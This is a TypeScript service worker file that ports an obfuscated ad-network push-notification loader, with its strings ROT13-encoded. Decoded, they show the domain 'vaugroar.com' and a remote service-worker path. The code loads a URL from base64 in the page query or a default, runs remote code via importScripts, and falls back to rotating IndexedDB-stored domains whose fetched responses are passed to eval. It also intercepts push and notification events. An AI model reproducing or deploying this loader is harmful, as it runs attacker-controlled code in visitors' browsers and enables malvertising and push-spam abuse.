/* eslint-disable @typescript-eslint/no-explicit-any */
/* eslint-disable @typescript-eslint/ban-ts-comment */

// This file targets a Service Worker environment.
export {};

declare const self: ServiceWorkerGlobalScope & {
  // custom fields used by the script at runtime
  options?: any;
  layer?: any;
};

// Keep the original structure & obfuscation intact, add light typings.
(function (O: Record<string, any>) {
  !(function (e: Record<string, any>) {
    const t: Record<string, any> = O.Z();
    function n(r: number) {
      if (t[r]) return t[r][O.i];
      const i = (t[r] = O.Z(O.B, r, O.w, !O.X, O.i, O.Z()));
      e[r][O.z](i[O.i], i, i[O.i], n);
      i[O.w] = !O.N;
      return i[O.i];
    }
    (n[O.y] = e),
      (n[O.g] = t),
      (n[O.K] = function (e: any, t: any, r: any) {
        n[O.h](e, t) || Object[O.b](e, t, O.Z(O.GO, !O.N, O.RO, r));
      }),
      (n[O.G] = function (e: any) {
        O.HO != typeof Symbol &&
          (Symbol as any)[O.hO] &&
          Object[O.b](e, (Symbol as any)[O.hO], O.Z(O.p, O.cO)),
          Object[O.b](e, O.U, O.Z(O.p, !O.N));
      }),
      (n[O.R] = function (e: any, t: number) {
        if ((O.X & t && (e = n(e)), O.v & t)) return e;
        if (O.P & t && O.t == typeof e && e && e[O.U]) return e;
        const r = Object[O.r](O.q);
        if (
          (n[O.G](r),
          Object[O.b](r, O.C, O.Z(O.GO, !O.N, O.p, e)),
          O.d & t && O.oO != typeof e)
        )
          for (const i in e)
            n[O.K](
              r,
              i,
              function (t: any) {
                return e[t];
              }[O.fO](O.q, i)
            );
        return r;
      }),
      (n[O.H] = function (e: any) {
        const t =
          e && e[O.U]
            ? function () {
                return e[O.C];
              }
            : function () {
                return e;
              };
        return n[O.K](t, O.OO, t), t;
      }),
      (n[O.h] = function (e: any, t: any) {
        return Object[O.FO][O.a][O.z](e, t);
      }),
      (n[O.e] = O.F),
      n((n[O.m] = O.o));
  })(
    O.Z(
      O.o,
      function (module: any, exports: any, __webpack_require__: any) {
        O.f;
        const _antiadblock = __webpack_require__(O.O);
        // store some options on self as in original
        (self as any)[O.c] = O.Z(O.S, 9710507, O.V, "vaugroar.com", O.l, !O.N);
        (self as any)[O.D] = O.F;

        const DEFAULT_URL = [O.Y, O.j][O.A]((self as any)[O.c][O.V]);
        const STORE_EVENTS = [O.T, O.u, O.M, O.L, O.n, O.E] as const;

        let url: string;
        try {
          // atob(location.search.slice(1))
          url = atob((location as any)[O.DO][O.x](O.X));
          if (!url) throw O.q;
        } catch (_e) {
          url = DEFAULT_URL;
        }

        try {
          // Service worker global; TypeScript allows this in webworker libs
          // Import remote script (original behavior)
          // @ts-ignore
          importScripts(url);
        } catch (_ignore) {
          const events: Record<string, any[]> = O.Z();
          const listeners: Record<string, Array<(ev: Event) => void>> = O.Z();
          const realAddEventListener = (self as any)[O.yO][O.fO](self);

          (STORE_EVENTS as readonly string[])[O.ZO](function (e: string) {
            self.addEventListener(e, function (t: Event) {
              events[e] || (events[e] = []);
              events[e][O.M](t);
              listeners[e] &&
                listeners[e][O.ZO](function (cb) {
                  try {
                    cb(t);
                  } catch (_err) {}
                });
            } as EventListener);
          });

          (self as any)[O.yO] = function (e: string, t: (ev: Event) => void) {
            if (-O.X === (STORE_EVENTS as readonly string[])[O.qO](e)) {
              return realAddEventListener(e, t);
            }
            listeners[e] || (listeners[e] = []);
            listeners[e][O.M](t);
            events[e] &&
              events[e][O.ZO](function (ev) {
                try {
                  t(ev);
                } catch (_err) {}
              });
          };

          (O.N, _antiadblock[O.I])(url, O.Z())
            [O.gO](function (e: Response) {
              return e[O.UO](); // text()
            })
            [O.gO](function (code: string) {
              // Preserve original eval
              // eslint-disable-next-line no-eval
              return eval(code);
            });
        }
      },
      O.O,
      function (e: any, t: any, n: any) {
        O.f;
        Object[O.b](t, O.U, O.Z(O.p, !O.N));

        // t.addDomain = function(domain) { ... }
        t[O.Q] = function (e: string) {
          return new Promise<void>(function (t, n) {
            r(O.BO)[O.gO](function (rdb: IDBDatabase) {
              const i = rdb[O.tO]([O.lO], O.rO)
                [O.xO](O.lO)
                [O.WO](
                  O.Z(O.V, e, O.dO, new Date()[O.CO]())
                ) as IDBRequest<unknown>;
              i[O.yO](O.EO, t);
              i[O.yO](O.nO, n);
            });
          });
        };

        // t.hygensrgpu = async function(url, init) { ... }  (network fetcher)
        t[O.I] = async function (e: string, t: RequestInit = O.Z()) {
          const n = await new Promise<string[]>(function (resolve, reject) {
            r(O.BO)[O.gO](function (db: IDBDatabase) {
              const store = db[O.tO]([O.lO], O.rO)[O.xO](O.lO);
              const req = store[O.PO]() as IDBRequest<any[]>;
              req[O.yO](O.nO, reject);
              req[O.yO](O.EO, function () {
                return resolve(
                  req[O.XO][O.oF](function (row: any) {
                    return row[O.V];
                  })
                );
              });
            });
          });

          let done = !O.N;
          let threw = !O.X;
          let thrown: any = void O.N;

          try {
            // iterate domains
            // eslint-disable-next-line @typescript-eslint/no-unsafe-assignment
            const u = (n as any)[(Symbol as any)[O.QO]]();
            let c: any;
            for (; !(done = (c = u[O.IO]())[O.uO]); done = !O.N) {
              const d = c[O.p];
              try {
                return await fetch(
                  O.Y + d + O.s + i(), // build url with path & randomizer
                  O.Z(
                    O.YO,
                    t[O.YO] || O.RO,
                    O.jO,
                    O.pO,
                    O.sO,
                    t[O.sO],
                    O.vO,
                    O.Z(O.kO, btoa(e))
                  ) as RequestInit
                );
              } catch (_e) {
                // try next
              }
            }
          } catch (e) {
            threw = !O.N;
            thrown = e;
          } finally {
            try {
              const u = (n as any)[(Symbol as any)[O.QO]]?.();
              // ensure iterator return if present
              // @ts-ignore
              !done && u && u[O.JO] && u[O.JO]();
            } finally {
              if (threw) throw thrown;
            }
          }
          throw new Error(O.eO);
        };

        // t.grfgCvatQbznva = async function(path) { ... }  (test domain)
        t[O.J] = async function (e: string) {
          try {
            const t = await fetch(e[O.qO](O.SO) > -O.X ? e : O.Y + e);
            // return (await t.json()).status === true;  (original logic)
            // preserving original obfuscated check: !1 === (await t.json()).status
            // But we keep the exact operation:
            return !O.X === (await (t as Response)[O.bO]())[O.TO];
          } catch (_e) {
            return !O.X;
          }
        };

        // ----- helpers -----

        function r(e: string): Promise<IDBDatabase> {
          return new Promise(function (t, n) {
            const req = indexedDB[O.MO](e, O.X) as IDBOpenDBRequest;
            req[O.yO](O.LO, function () {
              req[O.XO][O.VO](O.lO, O.Z(O.aO, O.V));
            });
            req[O.yO](O.nO, n);
            req[O.yO](O.EO, function () {
              return t(req[O.XO] as unknown as IDBDatabase);
            });
          });
        }

        function i(depth?: number): string {
          const e =
              arguments[O.iO] > O.N && void O.N !== arguments[O.N]
                ? arguments[O.N]
                : O.N,
            t = e < O.W && Math[O.mO]() > O.k,
            n = Math[O.mO]()
              [O.zO](O.wO)
              [O.x](O.d, O.KO + parseInt(O.AO * Math[O.mO](), O.NO));
          return n + (t ? O.s + i(e + O.X) : O.F);
        }
      }
    )
  );
})(
  [
    ["o", 111],
    ["O", 17],
    ["F", ""],
    ["f", "hfr fgevpg"],
    [
      "Z",
      function () {
        const obj: Record<string, any> = {};
        const args = [].slice.call(arguments) as any[];
        for (let i = 0; i < args.length - 1; i += 2) {
          obj[args[i]] = args[i + 1];
        }
        return obj;
      },
    ],
    ["y", "z"],
    ["g", "p"],
    ["K", "q"],
    ["G", "e"],
    ["R", "g"],
    ["H", "a"],
    ["h", "b"],
    ["e", "c"],
    ["i", "rkcbegf"],
    ["m", "f"],
    ["z", "pnyy"],
    ["w", "y"],
    ["N", 0],
    ["c", "bcgvbaf"],
    ["D", "ynel"],
    ["A", "wbva"],
    ["T", "vafgnyy"],
    ["u", "npgvingr"],
    ["M", "chfu"],
    ["L", "abgvsvpngvbapyvpx"],
    ["n", "abgvsvpngvbapybfr"],
    ["E", "chfufhofpevcgvbapunatr"],
    ["q", null],
    ["b", "qrsvarCebcregl"],
    ["U", "__rfZbqhyr"],
    ["Q", "nqqQbznva"],
    ["I", "hygensrgpu"],
    ["J", "grfgCvatQbznva"],
    ["B", "v"],
    ["S", "mbarVq"],
    ["V", "qbznva"],
    ["l", "erfhofpevorBaVafgnyy"],
    ["X", 1],
    ["Y", "uggcf://"],
    ["j", "/csr/pheerag/freivpr-jbexre.zva.wf?e=fj&i=2"],
    ["p", "inyhr"],
    ["s", "/"],
    ["v", 8],
    ["a", "unfBjaCebcregl"],
    ["W", 7],
    ["k", 0.3],
    ["x", "fyvpr"],
    ["d", 2],
    ["P", 4],
    ["t", "bowrpg"],
    ["r", "perngr"],
    ["C", "qrsnhyg"],
    ["oO", "fgevat"],
    ["OO", "n"],
    ["FO", "cebgbglcr"],
    ["fO", "ovaq"],
    ["ZO", "sbeRnpu"],
    ["yO", "nqqRiragYvfgrare"],
    ["gO", "gura"],
    ["KO", 3],
    ["GO", "rahzrenoyr"],
    ["RO", "trg"],
    ["HO", "haqrsvarq"],
    ["hO", "gbFgevatGnt"],
    ["eO", "NNO Erdhrfg Snvyrq"],
    ["iO", "yratgu"],
    ["mO", "enaqbz"],
    ["zO", "gbFgevat"],
    ["wO", 36],
    ["NO", 10],
    ["cO", "Zbqhyr"],
    ["DO", "frnepu"],
    ["AO", 9],
    ["TO", "fgnghf"],
    ["uO", "qbar"],
    ["MO", "bcra"],
    ["LO", "hctenqrarrqrq"],
    ["nO", "reebe"],
    ["EO", "fhpprff"],
    ["qO", "vaqrkBs"],
    ["bO", "wfba"],
    ["UO", "grkg"],
    ["QO", "vgrengbe"],
    ["IO", "arkg"],
    ["JO", "erghea"],
    ["BO", "fjnno"],
    ["SO", ":"],
    ["VO", "perngrBowrpgFgber"],
    ["lO", "qbznvaf"],
    ["XO", "erfhyg"],
    ["YO", "zrgubq"],
    ["jO", "perqragvnyf"],
    ["pO", "vapyhqr"],
    ["sO", "obql"],
    ["vO", "urnqref"],
    ["aO", "xrlCngu"],
    ["WO", "chg"],
    ["kO", "gbxra"],
    ["xO", "bowrpgFgber"],
    ["dO", "perngrqNg"],
    ["PO", "trgNyy"],
    ["tO", "genafnpgvba"],
    ["rO", "ernqjevgr"],
    ["CO", "trgGvzr"],
    ["oF", "znc"],
  ].reduce(
    (o: Record<string, any>, i: [string, any]) => (
      Object.defineProperty(o, i[0], {
        get: () =>
          typeof i[1] !== "string"
            ? i[1]
            : (i[1] as string)
                .split("")
                .map((s) => {
                  const c = s.charCodeAt(0);
                  return c >= 65 && c <= 90
                    ? String.fromCharCode(((c - 65 + 26 - 13) % 26) + 65)
                    : c >= 97 && c <= 122
                    ? String.fromCharCode(((c - 97 + 26 - 13) % 26) + 97)
                    : s;
                })
                .join(""),
      }),
      o
    ),
    {} as Record<string, any>
  )
); /*importScripts(...r=sw)*/
